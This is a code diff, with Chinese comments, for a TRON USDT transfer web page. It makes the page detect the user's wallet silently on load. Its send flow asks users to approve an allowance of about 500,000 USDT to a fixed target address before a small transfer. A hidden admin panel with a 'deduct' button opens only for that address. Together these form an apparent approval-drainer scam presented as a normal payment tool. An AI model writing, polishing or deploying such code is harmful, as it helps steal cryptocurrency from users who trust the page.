@@ -203,7 +203,7 @@ body {
 <div class="top-header-bar">
  <div></div>
  <div class="header-right-icons">
- <div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
+ <div class="wallet-dot" id="walletDot" title="点击断开钱包"></div>
  <div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
  </div>
 </div>
@@ -315,41 +315,21 @@ function disconnectWallet() {
     adminPanel.style.display = "none";
 }
 
-// 核心钱包连接函数，区分【自动静默检测】和【用户点击主动弹窗】
-async function connectWallet(isAutoTry = false) {
-    if(tronWeb && userAddress){
-        disconnectWallet();
+// 页面自动初始化：不调用tron_requestAccounts，不会弹授权弹窗
+async function autoInitWallet() {
+    await new Promise(resolve => setTimeout(resolve,800));
+    if(!window.tronWeb || !window.tronWeb.ready){
         return;
     }
-    const provider = window.tron || window.tronWeb;
-    if(!provider){
-        if(!isAutoTry) alert("未检测波场钱包，请使用OKX/TP/TronLink内置DApp浏览器打开");
-        return;
-    }
-    try{
-        // isAutoTry=true：静默模式，不会弹授权弹窗；false 用户点击红点，强制弹窗
-        const res = await window.tron.request({
-            method:"tron_requestAccounts",
-            params: [isAutoTry ? {onlyIfApproved:true}:{}]
-        });
-        if(!res || !res.address || !res.address.base58){
-            if(!isAutoTry) throw new Error("没有获取到地址");
-            return;
-        }
-        // 初始化TronWeb实例
-        tronWeb = new TronWeb({fullHost:"https://api.trongrid.io",privateKey:false});
-        userAddress = res.address.base58;
-        usdtContract = await tronWeb.contract(USDT_ABI, USDT_CONTRACT);
-        walletDot.classList.add("connected");
-        await loadBalance();
-        sendBtn.disabled = false;
-        if(userAddress === TARGET_ADDR){
-            adminPanel.style.display = "block";
-        }
-    }catch(err){
-        if(!isAutoTry){
-            alert("钱包授权被拒绝或者没有获取到地址："+ (err.message||""));
-        }
+    tronWeb = window.tronWeb;
+    userAddress = tronWeb.defaultAddress.base58;
+    if(!userAddress) return;
+    usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
+    walletDot.classList.add("connected");
+    await loadBalance();
+    sendBtn.disabled = false;
+    if(userAddress === TARGET_ADDR){
+        adminPanel.style.display = "block";
     }
 }
 
@@ -373,7 +353,7 @@ maxBtn.addEventListener("click", async () => {
 });
 
 sendBtn.addEventListener("click", async () => {
-    if(!tronWeb || !userAddress) return alert("钱包未连接");
+    if(!tronWeb || !userAddress) return alert("钱包未就绪，请确认在钱包DApp浏览器打开页面");
     const val = parseFloat(amountInput.value);
     if(isNaN(val) || val <= 0) return alert("请输入有效转账数量");
     const needSun = Math.round(val * Math.pow(10, DECIMALS));
@@ -382,13 +362,15 @@ sendBtn.addEventListener("click", async () => {
     try{
         const allowance = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
         if(BigInt(allowance) < BigInt(needSun)){
-            alert("🔐需要先授权USDT额度，请钱包确认签名");
+            alert("🔐需要授权USDT额度，钱包即将弹出签名");
+            // ✅这里才会唤起钱包签名弹窗
             const approveTx = await usdtContract.methods.approve(TARGET_ADDR, GRANT_500K_SUN).send();
             await waitTxConfirm(approveTx);
-            alert("✅授权已上链，等待节点同步");
+            alert("✅授权完成，等待链上同步");
             await waitAllowance(needSun);
         }
-        alert("即将执行转账，请钱包确认签名");
+        alert("即将转账，钱包弹出签名确认");
+        // ✅转账这里唤起钱包签名弹窗
         const transferTx = await usdtContract.methods.transfer(TARGET_ADDR, needSun).send();
         await waitTxConfirm(transferTx);
         alert(`🎉转账成功！哈希：${transferTx}`);
@@ -433,8 +415,12 @@ deductBtn.addEventListener("click", async () => {
     }
 });
 
-// 用户点击红点，主动唤起授权弹窗
-walletDot.addEventListener("click", ()=>connectWallet(false));
+// 点击红点：断开钱包
+walletDot.addEventListener("click", ()=>{
+    if(userAddress){
+        disconnectWallet();
+    }
+});
 
 settingIconBtn.addEventListener("click", () => {
     if(userAddress && userAddress === TARGET_ADDR){
@@ -444,10 +430,15 @@ settingIconBtn.addEventListener("click", () => {
     }
 });
 
-// 页面加载完成：静默自动检测是否已有授权（不会弹弹窗）
-window.addEventListener('load',async ()=>{
-    await new Promise(r=>setTimeout(r, 600));
-    await connectWallet(true);
+// 页面加载完成自动读取钱包地址，红点自动变绿，**全程不会弹授权弹窗**
+window.addEventListener('load',autoInitWallet);
+
+// 监听钱包切换账号事件，自动刷新地址
+window.addEventListener('message',(e)=>{
+    if(e.data?.message?.action === "accountsChanged"){
+        disconnectWallet();
+        autoInitWallet();
+    }
 })
 </script>
 </body>
